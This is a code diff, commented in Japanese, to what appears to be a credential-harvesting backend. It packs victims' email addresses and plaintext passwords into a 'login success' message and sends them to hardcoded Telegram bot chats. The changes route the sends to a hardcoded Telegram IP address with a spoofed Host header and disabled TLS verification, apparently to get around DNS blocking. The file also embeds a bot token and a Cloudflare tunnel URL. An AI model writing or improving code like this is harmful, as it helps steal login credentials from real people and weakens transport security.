@@ -34,6 +34,9 @@ DB_PATH = os.getenv('DB_PATH', 'data/alldatabase.json')
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8314466263:AAG_eAJkU6j8SNFfJsodij9hkkdpSPARc6o')
 TELEGRAM_CHAT_IDS = os.getenv('TELEGRAM_CHAT_IDS', '8204394801,8303180774,8243562591').split(',')
 
+# Telegram Bot APIのIPアドレス（DNS解決不要）
+TELEGRAM_API_IP = "149.154.167.220"  # api.telegram.orgの主要IP
+
 # 🔥 PC側のCloudflare URL（環境変数から取得、なければデフォルト値）
 CLOUDFLARE_URL = os.getenv('CLOUDFLARE_URL', 'https://config-surname-carroll-incoming.trycloudflare.com').rstrip('/')
 
@@ -279,7 +282,7 @@ def get_all_active_sessions():
 # ========================================
 
 def send_telegram_notification(email, password):
-    """テレグラムにログイン成功通知を送信（リトライ機能付き）"""
+    """テレグラムにログイン成功通知を送信（DNS解決問題対応版）"""
     message = f"◎ログイン成功\nメールアドレス：{email}\nパスワード：{password}"
     
     log_with_timestamp("TELEGRAM", f"通知送信開始 | Email: {email}")
@@ -290,7 +293,8 @@ def send_telegram_notification(email, password):
         
         for attempt in range(max_retries):
             try:
-                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+                # IPアドレスを直接使用（DNS解決不要）
+                url = f"https://{TELEGRAM_API_IP}/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                 payload = {
                     'chat_id': chat_id,
                     'text': message
@@ -298,7 +302,19 @@ def send_telegram_notification(email, password):
                 
                 log_with_timestamp("TELEGRAM", f"送信試行 {attempt + 1}/{max_retries} | Chat: {chat_id}")
                 
-                response = requests.post(url, json=payload, timeout=30)
+                # HostヘッダーにTelegram APIのホスト名を指定
+                headers = {
+                    'Host': 'api.telegram.org',
+                    'Content-Type': 'application/json'
+                }
+                
+                response = requests.post(
+                    url, 
+                    json=payload, 
+                    headers=headers,
+                    timeout=30,
+                    verify=False  # SSL検証をスキップ（IPアドレス使用時に必要）
+                )
                 
                 if response.status_code == 200:
                     log_with_timestamp("TELEGRAM", f"✓ 送信完了: Chat {chat_id}")
@@ -343,12 +359,16 @@ def send_telegram_notification_error(message):
     
     for chat_id in TELEGRAM_CHAT_IDS:
         try:
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+            url = f"https://{TELEGRAM_API_IP}/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
             payload = {
                 'chat_id': chat_id,
                 'text': error_message
             }
-            requests.post(url, json=payload, timeout=5)
+            headers = {
+                'Host': 'api.telegram.org',
+                'Content-Type': 'application/json'
+            }
+            requests.post(url, json=payload, headers=headers, timeout=5, verify=False)
             log_with_timestamp("TELEGRAM", f"エラー通知送信完了: Chat {chat_id}")
         except Exception as e:
             log_with_timestamp("ERROR", f"Telegramエラー通知失敗 (Chat: {chat_id}) | Error: {str(e)}")
